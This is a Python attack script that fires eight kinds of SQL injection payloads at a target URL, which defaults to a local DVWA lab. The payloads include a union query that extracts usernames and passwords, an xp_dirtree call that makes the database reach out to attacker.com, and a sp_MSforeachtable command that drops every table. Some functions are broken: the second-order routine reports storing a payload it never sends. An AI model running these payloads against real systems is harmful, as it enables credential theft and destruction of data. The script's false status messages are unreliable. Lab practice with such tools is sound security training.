import requests
import time

# Set your target URL here for testing (e.g., DVWA, bWAPP)
TARGET_URL = "http://127.0.0.1/dvwa/vulnerabilities/sqli/"  # Change to your test environment

# Classic SQL Injection
def classic_sql_injection():
    print("\n[Classic SQL Injection]")
    payload = "' OR '1'='1"
    response = requests.get(f"{TARGET_URL}?username=admin&password={payload}")
    print(f"Payload: {payload}\nResponse: {response.status_code}")

# Error-Based SQL Injection
def error_based_sql_injection():
    print("\n[Error-Based SQL Injection]")
    payload = "' OR 1=1--"
    response = requests.get(f"{TARGET_URL}?username=admin&password={payload}")
    if "error" in response.text.lower():
        print(f"Error message detected with payload: {payload}")

# Union-Based SQL Injection
def union_based_sql_injection():
    print("\n[Union-Based SQL Injection]")
    payload = "' UNION SELECT username, password FROM users--"
    response = requests.get(f"{TARGET_URL}?username=admin&password={payload}")
    print(f"Payload: {payload}\nResponse Text: {response.text[:100]}...")

# Boolean-Based Blind SQL Injection
def boolean_based_blind_sql_injection():
    print("\n[Boolean-Based Blind SQL Injection]")
    true_payload = "' AND 1=1--"
    false_payload = "' AND 1=2--"
    true_response = requests.get(f"{TARGET_URL}?username=admin&password={true_payload}")
    false_response = requests.get(f"{TARGET_URL}?username=admin&password={false_payload}")
    if true_response.text != false_response.text:
        print("Boolean-based injection possible")

# Time-Based Blind SQL Injection
def time_based_blind_sql_injection():
    print("\n[Time-Based Blind SQL Injection]")
    payload = "'; IF (1=1) WAITFOR DELAY '00:00:05'--"
    start = time.time()
    response = requests.get(f"{TARGET_URL}?username=admin&password={payload}")
    delay = time.time() - start
    if delay >= 5:
        print("Time-based injection confirmed")

# Out-of-Band SQL Injection
def out_of_band_sql_injection():
    print("\n[Out-of-Band SQL Injection]")
    payload = "'; EXEC xp_dirtree('//attacker.com/a')--"
    response = requests.get(f"{TARGET_URL}?username=admin&password={payload}")
    print("Out-of-band payload sent. Check attacker.com logs for connection.")

# Stored Procedure Injection
def stored_procedure_injection():
    print("\n[Stored Procedure Injection]")
    payload = "'; EXEC sp_MSforeachtable 'DROP TABLE ?'--"
    response = requests.get(f"{TARGET_URL}?username=admin&password={payload}")
    print(f"Payload: {payload}\nResponse Code: {response.status_code}")

# Second-Order SQL Injection
def second_order_sql_injection():
    print("\n[Second-Order SQL Injection]")
    initial_payload = "'; INSERT INTO users (username) VALUES ('malicious')--"
    follow_up_payload = "'; SELECT * FROM users WHERE username='malicious'--"
    print("Stored initial payload in database.")
    print("Follow-up payload will search for 'malicious' user data.")

# Running each SQL injection type
classic_sql_injection()
error_based_sql_injection()
union_based_sql_injection()
boolean_based_blind_sql_injection()
time_based_blind_sql_injection()
out_of_band_sql_injection()
stored_procedure_injection()
second_order_sql_injection()
